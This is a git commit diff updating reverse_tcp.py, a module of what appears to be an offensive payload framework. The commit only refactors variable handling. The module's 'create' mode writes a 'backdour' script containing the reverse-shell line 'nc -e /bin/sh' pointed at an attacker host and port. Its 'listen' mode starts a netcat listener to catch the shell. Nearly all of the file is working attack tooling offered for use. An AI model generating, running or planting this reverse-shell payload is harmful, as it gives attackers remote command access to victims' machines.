d3fa695d9194582f14d38ced6b7ac7c1a2c7c3f7
Amer Araibia <46226856+ameraraibia168@users.noreply.github.com>
2024-07-13 11:43:12 +0100

    Update reverse_tcp.py

--- waf/modules/payloads/nc/ncat/reverse_tcp.py
+++ waf/modules/payloads/nc/ncat/reverse_tcp.py
@@ -9,19 +9,19 @@ info = {
         "description" : "Payload creation and exploitation"
 }
 
-var.lname = ["payload.sh"]
-var.ltype = ["listen"]
+var.all_var['lname'] = "payload.sh"
+var.all_var['ltype'] = "listen"
 
 options ={
-  "LHOST" : [str(var.lhost[0]),'The listen address'],
-  "LPORT" : [str(var.lport[0]),'The listen port'],
-  "LNAME" : [str(var.lname[0]),'The name of payload'],
-  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
+  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
+  "LPORT" : [str(var.all_var['lport']),'The listen port'],
+  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
+  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
 }
 
 def running():
     try:
-        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
+        if var.all_var['ltype'].lower() == "create":
             print ("")
             print (blue+"[*]"+default+ "Create a backdour")
             time.sleep(2)
@@ -32,16 +32,16 @@ def running():
             time.sleep(2)
             print ("")
             mark = ' '
-            f = open(var.lname[0] , 'w')
+            f = open(var.all_var['lname'] , 'w')
             payload = '''
 
-nc -e /bin/sh '''+lhost[0]+mark+lport[0]+ '''
+nc -e /bin/sh '''+var.all_var['lhost']+mark+var.all_var['lport']+ '''
 '''
             f.write(payload)
             f.close()
 
-        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
-            os.system("nc -l -p "+str(var.lport[0])+" -v")
+        elif var.all_var['ltype'].lower() == "listen":
+            os.system("nc -l -p "+str(var.all_var['lport'])+" -v")
 
         else:
             print (red+"[-]"+default+"Choose LTYPE " )
